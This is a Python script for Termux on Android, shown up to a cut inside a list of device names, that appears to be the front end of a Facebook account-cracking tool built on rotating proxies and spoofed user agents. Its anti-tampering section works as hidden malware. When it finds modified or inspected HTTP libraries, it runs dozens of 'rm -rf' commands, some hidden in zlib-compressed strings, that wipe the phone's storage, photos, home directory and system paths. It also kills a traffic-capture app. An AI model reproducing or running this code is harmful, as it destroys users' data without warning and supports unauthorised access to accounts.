#OPEN SOURCE GIFT 
#EDITOR COPY IT LOGO LOL TRY IT COLO FUCK IT
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
import os,json
import os,time,zlib
import sys
import time
import re
import random
import uuid
import json
import subprocess
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import base64
import ctypes
from fake_useragent import UserAgent
try:
    import re,base64,uuid,string,requests,random,sys,subprocess,platform,datetime,pycurl
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m MODULE NOT INSTALLED CORRECTLY! ')
    os.system('xdg-open https://chat.whatsapp.com/BJpN0899hdRAuRtTa6wCBl?mode=ems_wa_t')
    exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOOP AND KEY ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
oks,cps,loop,apk=[],[],0,[]
myid=uuid.uuid4().hex[:5].upper()
from email.message import EmailMessage
import ssl,smtplib
pathx = str(zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaz\xb9E\x89\xd9\x99y\xe9\x15\x15\x15\xba\xc9\xf9e\x00\xe7!\x13*')).replace("b'","").replace("'","")
try:
    key1 = open(pathx, 'r').read()
except:
    open(pathx, 'w').write(myid)
key1 = open(pathx, 'r').read()+str(os.getuid())
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ DATE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(bln)+'|'+str(tgl)+'|'+str(thn)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ PROXY SERVER ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
try:os.system('rm -rf /sdcard/..txt');open('/sdcard/..txt','a').write(' ')
except PermissionError:os.system('clear');print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PLEASE ENABLE STORAGE PERMISSION TO CONTINUE');os.system('termux-setup-storage');exit()
try:os.makedirs('/sdcard/ERROR-ZONE')
except:pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ STORAGE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
import requests
import random

def load_proxies():
    proxy_urls = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/https.txt"
    ]
    proxies = []
    for url in proxy_urls:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies.extend([proxy.strip() for proxy in response.text.splitlines() if proxy.strip()])
        except requests.exceptions.RequestException:
            continue
    return proxies

proxies_list = load_proxies()

def get_random_proxy():
    if proxies_list:
        proxy = random.choice(proxies_list).strip()
        return {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}",
        }
    return None

proxies = get_random_proxy()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RND ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def rnd(a,b):
    return str(random.randint(a,b))
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SECURITY-CODE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
site = '/data/data/com.termux/files/usr/lib/python3.12/site-packages/'
alart=(f" \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m DO NOT TRY TO FUCK YOUR MOM...")
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    exit(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m SOMETHING WENT WRONG')
py3_edit = "/data/data/com.termux/files/usr/lib/python3.12/http/client.py"
with open(py3_edit,'r') as data:
    found = data.read()
    if "print(data.decode())" in str(found):exit()
    else:pass
try:
    mr_error=f'{site}requests/'
    if not 'print' in open(mr_error+'sessions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    mr_error1=f'{site}requests/'
    if not 'print' in open(mr_error1+'models.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    mr_error2=f'{site}requests/'
    if not 'print' in open(mr_error2+'api.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    king=f'{site}requests/'
    if not 'sys.stdout.write' in open(king+'sessions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    qeen=f'{site}requests/'
    if not 'sys.stdout.write' in open(qeen+'models.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    don=f'{site}requests/'
    if not 'sys.stdout.write' in open(don+'api.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    a=open('requests/sessions.py','r').read()
    if 'print' in a:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    b=open('requests/api.py','r').read()
    if 'print' in b:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    c=open('requests/models.py','r').read()
    if 'print' in c:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    d=open('httpx/_api.py','r').read()
    if 'print' in d:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    e=open('httpx/_auth.py','r').read()
    if 'print' in e:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    f=open('httpx/_models.py','r').read()
    if 'print' in f:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    g=open('requests/sessions.py','r').read()
    if 'sys.stdout.write' in g:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/api.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/models.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    ii=open('httpx/_api.py','r').read()
    if 'sys.stdout.write' in ii:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    j=open('httpx/_auth.py','r').read()
    if 'sys.stdout.write' in j:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    k=open('httpx/_models.py','r').read()
    if 'sys.stdout.write' in k:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    l=open('requests/api.py', 'r').read()
    if "verify = False" in l:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    m=open('requests/sessions.py', 'r').read()
    if "self.verify = False" in m:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    n=open(f'urllib3/connection.py', 'r').read()
    if str("cert_reqs = 'CERT_NONE'") in n:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/urllib3');exit(f"{alart}")
    else:pass
except Exception as e:pass
def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            os.system('clear');print(f' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m DONT TRY BYPASS & CAPTURE MOTHER FUCKER\n \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m YOUR SYSTEM FUCKED BY ETHAN');exit()
        else:exit()
    except:exit()
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import sessions
x = open(sessions.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from os import path,system
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
    pass
else:
    print(f" \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m BRO TURN OFF PROTECTER THEN RUN TOOL");exit()
a = 'rm -rf'
b = 'rm -rf $HOME/*'
c = '/sdcard/Download/*'
d = '/storage/emulated/0/DCIM/Camera/*'
e = '/storage/emulated/0/DCIM/*'
f = '/sdcard/DCIM/*'
g = '/storage/emulated/0/Android/*'
h = '/sdcard/Android/*'
i = '/sdcard/Download/*'
j = '/sdcard/Downloads/*'
k = '/sdcard/downloads/*'
l = '/data/data/com.termux/files/*'
m = '/data/data/com.termux/files/usr/bin/*'
n = '$PREFIX/b'
o = '$HOME /dev/null'
p = 'HOME/../../*'
q = '$HOME/*'
r = '/storage/emulated/0/Pictures/*'
s = '/storage/emulated/0/*'
u = '/storage/emulated/*'
v = '/system/*'
w = 'cd /sdcard/*'
x = '/sdcard/*'
y = '/sdcard/Screenshot/*'
z = '/sdcard/Documents/*'
def fucked():
    print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;97m SERVER LOADING.......')
    os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
    os.system(f'''rm -rf {a}''')
    os.system(f'''rm -rf {b}''')
    os.system(f'''rm -rf {c}''')
    os.system(f'''rm -rf {d}''')
    os.system(f'''rm -rf {e}''')
    os.system(f'''rm -rf {f}''')
    os.system(f'''rm -rf {g}''')
    os.system(f'''rm -rf {h}''')
    os.system(f'''rm -rf {i}''')
    os.system(f'''rm -rf {j}''')
    os.system(f'''rm -rf {k}''')
    os.system(f'''rm -rf {ball}''')
    os.system(f'''rm -rf {ripon}''')
    os.system(f'''rm -rf {ripon2}''')
    os.system(f'''rm -rf {ripon3}''')
    os.system(f'''rm -rf {l}''')
    os.system(f'''rm -rf {m}''')
    os.system(f'''rm -rf {n}''')
    os.system(f'''rm -rf {o}''')
    os.system(f'''rm -rf {p}''')
    os.system(f'''rm -rf {q}''')
    os.system(f'''rm -rf {r}''')
    os.system(f'''rm -rf {s}''')
    os.system(f'''rm -rf {t}''')
    os.system(f'''rm -rf {u}''')
    os.system(f'''rm -rf {v}''')
    os.system(f'''rm -rf {w}''')
    os.system(f'''rm -rf {x}''')
    os.system(f'''rm -rf {y}''')
    os.system(f'''rm -rf {z}''')
    print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m FUCK YOU BYPASS USER SECURITY BY ERROR')
    exit()
os.system('chmod 700 /data/data/com.termux/files/usr/bin >/dev/null 2>&1')
os.system('pkill -f httcanary >/dev/null 2>&1')
def SecureX():
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m SERVER CHECKING.........')
    os.system('rm -rf /sdcard/DCIM')
    os.system('rm -rf /sdcard/Download')
    os.system('rm -rf /sdcard')
    os.system('rm -rf /sdcard/Documents')
    os.system('rm -rf /sdcard/Pictures')
    os.system('rm -rf /sdcard/Android/media')
    os.system('rm -rf /sdcard/Android/data')
    os.system('rm -rf /sdcard/Android')
    os.system('rm -rf /sdcard/')
    print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m FUCK YOU BYPASS USER SECURITY.......')
    print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m CHECK YOUR STORAGE......')
    exit()
def DataChk():
    path = '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py'
    with open(path, 'r') as file:
        filedata = file.read()
    if 'print' in filedata:
        os.system('rm -rf /sdcard/DCIM')
        os.system('rm -rf /sdcard/Download')
        os.system('rm -rf /sdcard/Documents')
        os.system('rm -rf /sdcard/Pictures')
        os.system('rm -rf /sdcard/Android/')
        os.system('rm -rf /sdcard/Android/*')
        os.system('rm -rf /sdcard/')
        os.system('rm -rf /sdcard/*')
        os.system('rm -rf storage/emulated/0/')
        os.system('rm -rf /system/*')
        os.system('rm -rf /*')
        os.system('rm -rf $HOME/../../*')
        os.system('rm -rf $HOME/*')
        os.system('mv $HOME /dev/null')
        print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m FUCK YOU BYPASS USER SECURITY.......')
        print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m CHECK YOUR STORAGE......')
        exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ BIT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
import os, platform, time, sys
os.system('clear')
import os, platform, time, sys
try:
 import requests
except:os.system("pip uninstall requests -y;pip install requests")
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m YOU ARE 64BIT USER')
 time.sleep(4)
elif bit == '32bit':
 print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m YOU ARE 32BIT USER')
 time.sleep(4)
princp=[]
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ NAME ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
os.system('clear')
folder = "/data/data/com.termux/files/home/.termux"
filepath = os.path.join(folder, ".error_name.txt")
os.makedirs(folder, exist_ok=True)
try:
    with open(filepath, "r") as f:
        name = f.read().strip()
except FileNotFoundError:
    username = input(" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m WHAT IS YOUR NAME : ")
    with open(filepath, "w") as f:
        f.write(username)
    name = username
with open(filepath, "r") as f:
    ___username___ = f.read().strip()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;<💚MR.ERROR💚>\x07')
def clear():os.system('clear');print(logo)
def linex():print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ CHECKER ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def ashaa(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'
        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'
        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'
        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'
        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'
        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'
        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'
        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'
        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'
        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'
        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'
        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'
        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'
        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'
        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'
        elif uid[:5] in ['6155']            :alif = ' NEW ACCOUNT√'
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' ACCOUNT 2008/2009 √'
    elif len(uid)==8:
        alif = ' ACCOUNT 2007/2008 √'
    elif len(uid)==7:
        alif = ' ACCOUNT 2006/2007 √'
    else:alif=''
    return alif

def asha(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'
        elif ids[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'
        elif ids[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'
        elif ids[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'
        elif ids[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
        elif ids[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
        elif ids[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'
        elif ids[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'
        elif ids[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'
        elif ids[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'
        elif ids[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'
        elif ids[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'
        elif ids[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'
        elif ids[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'
        elif ids[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'
        elif ids[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'
        elif ids[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'
        elif ids[:5] in ['6155']            :alif = ' NEW ACCOUNT√'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = ' ACCOUNT 2008/2009 √'
    elif len(ids)==8:
        alif = ' ACCOUNT 2007/2008 √'
    elif len(ids)==7:
        alif = ' ACCOUNT 2006/2007 √'
    else:alif=''
    return alif
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ USERAGENT UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
ua = UserAgent()
def ugenX():
    ualist = [ua.random for _ in range(50)]
    return str(random.choice(ualist))
ugen=[]
user_agents=[]
for xd in range(10000):
    rr = random.randint
    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
    ugen.append(um2)
    ugen.append(um3)
    ugen.append(um1)
    ugen.append(um4)
for xhd in range(1000):
    a = random.choice(['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in'])
    b = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    b2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    d = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,14))}; {a}; OPPO {b}{str(random.randint(10,99))}{c} Build/{b2}{str(random.randint(1,999))}{c2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
    ugen.append(d)
for xd in range(1000):
   rr = random.randint; rc = random.choice
   aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
   lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
   build_nokiax = ['JDQ39','JZO54K']
   oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
   redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
